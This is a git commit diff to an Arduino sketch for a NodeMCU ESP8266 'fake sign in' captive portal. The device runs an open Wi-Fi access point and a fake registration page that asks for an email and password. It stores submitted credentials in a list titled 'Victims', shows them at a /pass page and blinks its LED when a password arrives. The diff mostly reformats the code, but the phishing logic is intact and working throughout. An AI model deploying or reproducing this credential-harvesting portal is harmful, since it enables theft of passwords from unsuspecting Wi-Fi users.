dd4cad296572af16cb3ac1897e430724960edc8a
Shahriar Shafin <32214710+ShahriarShafin@users.noreply.github.com>
2020-09-15 04:26:19 +0600

    Update NodeMcu-ESP8266_Fake_sign_in.ino

--- NodeMcu-ESP8266_Fake_sign_in.ino
+++ NodeMcu-ESP8266_Fake_sign_in.ino
@@ -1,3 +1,6 @@
+// NodeMcu-ESP8266 Fake sign in
+// Based on: PopupChat https://github.com/tlack/popup-chat
+
 // Includes
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
@@ -9,11 +12,11 @@
 #define TITLE "Register:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
-#define POST_BODY " Your account is being validated. Please, wait up to 5 minutes for device connection.</br> Thank you."
+#define POST_BODY " Your account is being validated. Please, wait up to 3 minutes for device connection.</br> Thank you."
 #define PASS_TITLE "Victims"
 #define CLEAR_TITLE "Cleared"
 
-// Init System Settings
+//System Settings
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
@@ -31,7 +34,7 @@ String input(String argName) {
 
 String footer() {
   return
-    "<br><br><br><br><br><footer><div><center><p>Copyright&#169; 2019-2020 | All rights reserved.</p></center></div></footer>";
+    "<br><footer><div><center><p>Copyright&#169; 2019-2020 | All rights reserved.</p></center></div></footer>";
 }
 
 String header(String t) {
@@ -40,20 +43,20 @@ String header(String t) {
                "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                "div { padding: 0.5em; }"
                "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
-         //    Data Input bar
+               // Data input box
                "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #08B794; }"
                "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-        //     Free WiFi (GREEN)bar
+               //  Free WiFi Navbar
                "nav { background: #08B794; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
                "textarea { width: 100%; }"
-             " input{width: 100%;border-box border: 2px solid red;border-radius: 4px}";
-               
+               " input{width: 100%;border-box border: 2px solid red;border-radius: 4px}";
+  //  index html
   String h = "<!DOCTYPE html><html>"
              "<head><title>" + a + " :: " + t + "</title>"
              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
              "<style>" + CSS + "</style></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE +"</nav><div><h1>" + t + "</h1></div>";
+             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div>";
   return h;
 }
 
@@ -66,16 +69,16 @@ String index() {
          "<b> Email:   </b> <center> <input  type=text autocomplete=email name=email placeholder=yourmail@gmail.com></center>" +
          "<b> Password:</b> <center> <input type=password name=password placeholder=password></center>" +
          "<p>&#9745;I have read and agree to the Privacy Policy</p>" +
- //SUBMIT
-        "<center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Register\"></center></form>" + footer();
-        
+         //SUBMIT
+         "<center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Register\"></center></form>" + footer();
+
 }
 
 
 String posted() {
   String email = input("email");
   String password = input("password");
-  Victims = "<li>Email:  <b>"+ email +"</b></br>Password:  <b style=color:#ea5455;>"+ password + "</b></li>" + Victims;
+  Victims = "<li>Email:  <b>" + email + "</b></br>Password:  <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
@@ -96,7 +99,6 @@ void BLINK() { // The internal LED will blink 3 times when a password is receive
     count = count + 1;
   }
 }
-
 void setup() {
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
@@ -106,6 +108,7 @@ void setup() {
   webServer.on("/post", []() {
     webServer.send(HTTP_CODE, "text/html", posted());
     BLINK();
+
   });
   webServer.on("/pass", []() {
     webServer.send(HTTP_CODE, "text/html", pass());
@@ -117,11 +120,11 @@ void setup() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", index());
   });
-  
+
   webServer.begin();
   pinMode(BUILTIN_LED, OUTPUT);
   digitalWrite(BUILTIN_LED, HIGH);
-  
+
 }
 
 
